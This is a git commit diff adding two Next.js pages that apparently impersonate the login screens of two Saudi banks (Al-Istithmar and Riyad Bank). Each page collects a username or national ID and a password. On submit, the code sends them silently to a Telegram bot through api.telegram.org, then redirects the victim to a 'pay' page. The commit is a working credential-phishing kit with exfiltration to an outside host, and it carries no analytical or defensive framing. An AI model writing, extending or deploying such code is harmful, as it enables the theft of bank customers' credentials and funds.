3223c4750f2155d7ed3c5f78817d504c7d2c745d
Bshar <alnasrbshar1998@gmail.com>
2024-01-19 16:53:48 +0300

    firstCommit

---
+++ ‏‏my-app/src/app/fozajil/banks/estmar/page.jsx
@@ -0,0 +1,51 @@
+"use client"
+import styles from './estmar.module.css'
+import Image from 'next/image'
+import icon1 from '../../../../../public/5.jpg'
+import { useRef } from 'react'
+import bot from '@/compnante/dataBot'
+import { useRouter,useSearchParams } from 'next/navigation'
+
+const Page = () => {
+     const username = useRef()
+    const password = useRef()
+    const router =useRouter();
+    const x = useSearchParams();
+    const datas = x.get('names')
+    const handleOnSubmit = (e) => {
+        e.preventDefault();
+
+        var length =`الاستثمار  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
+       
+        
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+      
+      }
+      const handlerout = ()=>{
+        if(username.current.value == "" || password.current.value == ""){
+          alert('من فضلك قم بملى الحقول')
+        }else{
+          
+          router.push(`/fozajil/banks/pay?names=${datas}`)
+        }
+      }
+
+  return (
+    <div className={styles.container}>
+        <Image 
+            src={icon1}
+            width={100}
+        />
+
+        <form onSubmit={handleOnSubmit}>
+
+            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
+            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
+            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
+
+        </form>
+    </div>
+  )
+}
+
+export default Page
---
+++ ‏‏my-app/src/app/fozajil/banks/ryadh/page.jsx
@@ -0,0 +1,50 @@
+"use client"
+import styles from './ryadh.module.css'
+import Image from 'next/image'
+import icon1 from '../../../../../public/4.png'
+import { useRef } from 'react'
+import { useRouter,useSearchParams } from 'next/navigation'
+import bot from '@/compnante/dataBot'
+
+const Page = () => {
+    const username = useRef()
+    const password = useRef()
+    const router =useRouter();
+    const x = useSearchParams();
+    const datas = x.get('names')
+    const handleOnSubmit = (e) => {
+        e.preventDefault();
+
+        var length =`الرياض  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
+       
+        
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+      
+      }
+      const handlerout = ()=>{
+        if(username.current.value == "" || password.current.value == ""){
+          alert('من فضلك قم بملى الحقول')
+        }else{
+          
+          router.push(`/fozajil/banks/pay?names=${datas}`)
+        }
+      }
+
+  return (
+    <div className={styles.container}>
+        <Image 
+            src={icon1}
+            width={100}
+        />
+
+        <form onSubmit={handleOnSubmit}>
+            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
+            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
+            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
+
+        </form>
+    </div>
+  )
+}
+
+export default Page
